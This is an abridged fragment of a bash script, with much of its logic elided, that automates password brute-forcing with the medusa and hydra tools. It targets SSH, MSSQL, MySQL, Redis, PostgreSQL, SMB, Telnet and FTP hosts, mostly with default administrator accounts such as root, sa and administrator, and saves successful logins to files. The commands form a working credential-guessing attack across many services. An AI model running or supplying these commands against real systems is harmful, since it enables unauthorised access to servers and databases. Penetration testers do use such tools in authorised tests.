...
do
    ...
    if [ $port -eq 22 ];then
        ...
        medusa -H ./${3}/${port}.txt -u root -e ns -P $5 -t 2 -T 16 -f -M ssh -R 1 -r 1 -O ./${3}/SSH_Login_succeed.txt
    ...
    if [ $port -eq 1433 ];then
        ...
        medusa -H ./${3}/${port}.txt -u sa -e ns -P $5 -t 2 -T 16 -f -M mssql -R 1 -r 1 -O ./${3}/Mssql_Login_succeed.txt
    ...
    if [ $port -eq 3306 ];then
        ...
        medusa -H ./${3}/${port}.txt -u root -e ns -P $5 -t 2 -T 16 -f -M mysql -R 1 -r 1 -O ./${3}/MySQL_Login_succeed.txt
    ...
    if [ $port -eq 6379 ];then
        ...
        hydra -P $5 -e ns -f -o ./${3}/Redis_Login_succeed.txt -M ./${3}/${port}.txt -t 3 -T 16 -w 1 -V redis
    ...
    if [ $port -eq 5432 ];then
        ...
        medusa -H ./${3}/${port}.txt -u postgres -e ns -P $5 -t 2 -T 16 -f -M postgres -R 1 -r 1 -O ./${3}/PgSQL_Login_succeed.txt
    ...
    if [ $port -eq 445 ];then
        ...
        hydra -l administrator -P $5 -e ns -f -o ./${3}/Smb_Login_succeed.txt -M ./${3}/${port}.txt -t 3 -T 16 -w 1 -V smb
    ...
    if [ $port -eq 23 ];then
        ...
        medusa -H ./${3}/${port}.txt -U $4 -e ns -P $5 -t 2 -T 16 -f -M telnet -R 1 -r 1 -O ./${3}/Telnet_Login_succeed.txt
    ...
    if [ $port -eq 21 ];then
        ...
        medusa -H ./${3}/${port}.txt -U $4 -e ns -P $5 -t 2 -T 16 -M ftp -R 1 -r 1 -O ./${3}/Ftp_Login_succeed.txt
